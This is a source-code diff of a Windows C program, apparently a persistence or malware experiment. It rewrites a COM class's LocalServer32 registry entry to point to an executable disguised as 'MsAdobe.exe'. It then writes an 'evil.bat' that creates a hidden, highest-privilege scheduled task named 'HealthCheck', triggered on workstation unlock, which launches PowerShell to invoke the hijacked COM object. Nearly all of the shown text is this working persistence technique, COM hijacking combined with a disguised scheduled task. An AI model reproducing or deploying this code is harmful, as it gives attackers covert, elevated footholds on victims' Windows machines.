@@ -64,18 +64,19 @@ int main()
         SendMessage(hwndEdit, WM_CHAR, (WPARAM)*p, 0);
     }
 	
-	//Set registry  Value - point to bankwestapp.exe
+	//Set registry  Value - point to MsAdobe.exe
 
 	HKEY hkey;
 	LPCSTR set_string_value = "c:\\Users\\saurav\\Desktop\\MsAdobe.exe";
 
-	RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{00f2b433-44e4-4d88-b2b0-2698a0a91dba}\\LocalServer32", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL); //open registry key handle.
+	RegOpenKeyExW(HKEY_CLASSES_ROOT, L"\\CLSID\\{29F458BE-8866-11D5-A3DD-00B0D0F3BAA7}\\LocalServer32", 0, KEY_SET_VALUE, &hkey); //open registry key handle.
+	//RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{00000001-0001-0001-0001-000000000001}\\LocalServer32", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL); //open registry key handle.
 	RegSetValueExA(hkey, "", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);	
 	RegCloseKey(hkey);
 	
 	//File Vars
 	const char* filename = "c:\\Users\\saurav\\Desktop\\evil.bat";
-    const char* filecontent = "schtasks /create /tn HealthCheck /tr \"Powershell -WindowStyle Hidden -Command \\\"[activator]::CreateInstance([type]::GetTypeFromCLSID(\'\'\'00f2b433-44e4-4d88-b2b0-2698a0a91dba\'\'\'))\\\"\" /rl HIGHEST /SC ONEVENT /EC \"Security\" /MO \"*[System/EventID=4801]\"";
+    const char* filecontent = "schtasks /create /tn HealthCheck /tr \"Powershell -WindowStyle Hidden -Command \\\"[activator]::CreateInstance([type]::GetTypeFromCLSID(29F458BE-8866-11D5-A3DD-00B0D0F3BAA7))\\\"\" /rl HIGHEST /SC ONEVENT /EC \"Security\" /MO \"*[System[(EventID=4801)]]\"";
 
 	//Create a File
 	HANDLE hfile;
